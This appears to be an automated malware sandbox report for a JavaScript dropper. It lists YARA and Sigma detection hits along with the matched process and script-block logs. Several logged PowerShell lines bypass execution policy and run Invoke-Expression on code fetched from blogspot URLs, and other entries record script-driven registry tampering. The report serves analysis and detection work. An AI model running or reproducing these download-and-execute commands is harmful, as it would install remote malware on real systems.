crowdsourced_yara_results.description: This signature fires on the presence of Base64 encoded URI prefixes (http:// and https://) across any file. The simple presence of such strings is not inherently an indicator of malicious content, but is worth further investigation.
crowdsourced_yara_results.author: InQuest Labs

attributes.magic: ASCII text, with very long lines (49738u), with CRLF, LF line terminators

sigma_analysis_results.rule_description: Detects suspicious PowerShell invocation with a parameter substring
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Daniel Bohannon (idea), Roberto Rodriguez (Fix)

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=PowerShell.EXE; Hashes=MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667; Description=Windows PowerShell; EventID=1; ParentCommandLine="C:\Windows\system32\wscript.exe" "C:\Users\Bruno\Desktop\cc61267b1404ee214a96cede26c3e7afb802b81db39afd4fc843a28d4.js"; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ep Bypass -c [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-Expression (IRm https://decjan2026.blogspot.com/////////nipoli.pdf); Start-Sleep -Seconds 17; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentImage=C:\Windows\SysWOW64\wscript.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description:
Detects instances of svchost.exe running with an unusual or uncommon command line parameter by excluding known legitimate or common patterns.
This could point at a file masquerading as svchost, a process injection, or hollowing of a legitimate svchost instance.

match_context.values: @{CommandLine=%WINDIR%\system32\svchost.exe; Image=C:\Windows\system32\svchost.exe; EventID=1}

sigma_analysis_results.rule_title: Change PowerShell Policies to an Insecure Level
sigma_analysis_results.rule_description: Detects changing the PowerShell script execution policy to a potentially insecure level using the "-ExecutionPolicy" flag.

sigma_analysis_results.rule_title: Change PowerShell Policies to an Insecure Level - PowerShell
sigma_analysis_results.rule_description: Detects changing the PowerShell script execution policy to a potentially insecure level using the "Set-ExecutionPolicy" cmdlet.

Adversaries may use hidden windows to conceal malicious activity from the plain sight of users.
In some cases, windows that would typically be displayed when an application carries out an operation can be hidden
Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs

match_context.values: @{ScriptBlockText=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (Invoke-RestMethod https://hotdecjanniygga.blogspot.com////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////Kinder.pdf); Start-Sleep -Seconds 29; MessageTotal=1; ScriptBlockId=a375c07b-3cca-46a5-a984-791b96ab0f87; Path=; EventID=4104; MessageNumber=1}

@{ScriptBlockText=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (Invoke-RestMethod https://hotdecjanniygga.blogspot.com////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////Kinder.pdf); Start-Sleep -Seconds 29; MessageTotal=1; ScriptBlockId=916beb31-8bd3-46a9-a070-c088e39aafb4; Path=; MessageNumber=1; EventID=4104}

@{ScriptBlockText=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (Invoke-RestMethod https://hotdecjanniygga.blogspot.com////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////Kinder.pdf); Start-Sleep -Seconds 29; Path=; ScriptBlockId=0d9da6c9-ddf3-4bd9-976b-90aab3407df9; MessageTotal=1; MessageNumber=1; EventID=4104}

sigma_analysis_results.rule_title: Registry Tampering by Potentially Suspicious Processes
sigma_analysis_results.rule_description:
Detects suspicious registry modifications made by suspicious processes such as script engine processes such as WScript, or CScript etc.
These processes are rarely used for legitimate registry modifications, and their activity may indicate an attempt to modify the registry
without using standard tools like regedit.exe or reg.exe, potentially for evasion and persistence.

match_context.values: @{Details=DWORD (0x00000001); EventID=13; Image=C:\Windows\System32\WScript.exe; EventType=SetValue; TargetObject=HKU\S-1-5-21-1070296143-2877979003-364783958-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass}

@{Details=DWORD (0x00000001); EventID=13; Image=C:\Windows\System32\WScript.exe; EventType=SetValue; TargetObject=HKU\S-1-5-21-1070296143-2877979003-364783958-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\IntranetName}

@{EventType=SetValue; Details=DWORD (0x00000001); Image=C:\Windows\System32\WScript.exe; EventID=13; TargetObject=HKU\S-1-5-21-1070296143-2877979003-364783958-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\UNCAsIntranet}

@{EventType=SetValue; EventID=13; Image=C:\Windows\System32\WScript.exe; Details=DWORD (0x00000000); TargetObject=HKU\S-1-5-21-1070296143-2877979003-364783958-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\AutoDetect}

@{EventType=SetValue; Details=QWORD (0x00000000-0x00468289); Image=C:\Windows\System32\WScript.exe; EventID=13; TargetObject=HKU\S-1-5-21-1070296143-2877979003-364783958-1001\Software\Microsoft\Windows Script\Settings\Telemetry\wscript.exe\JScriptSetScriptStateStarted}

sigma_analysis_results.rule_description: Detects potentially suspicious keywords that could indicate the use of a PowerShell exploitation framework
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Perez Diego (@darkquassar), Tuan Le (NCSGroup)

sigma_analysis_results.rule_title: Potential Binary Or Script Dropper Via PowerShell
sigma_analysis_results.rule_description: Detects PowerShell creating a binary executable or a script file.

sigma_analysis_results.rule_title: Suspicious PowerShell Invocation From Script Engines
sigma_analysis_results.rule_description: Detects suspicious powershell invocations from interpreters or unusual programs

sigma_analysis_results.rule_description:
Adversaries may abuse the Windows command shell for execution.
The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems.
The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands.
Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops.
Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple system

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine
sigma_analysis_results.rule_author: James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger

sigma_analysis_results.rule_description: Get the processes that are running on the local computer.

sigma_analysis_results.rule_title: Potential PowerShell Obfuscation Using Alias Cmdlets
sigma_analysis_results.rule_description: Detects Set-Alias or New-Alias cmdlet usage. Which can be use as a mean to obfuscate PowerShell scripts

match_context.values: @{ScriptBlockText=Set-Alias -Name ncim -Value New-CimInstance  -Option ReadOnly, AllScope -ErrorAction SilentlyContinue; Path=; ScriptBlockId=a1ba5855-63f0-4a05-a07b-ca3b22625305; MessageTotal=1; MessageNumber=1; EventID=4104}
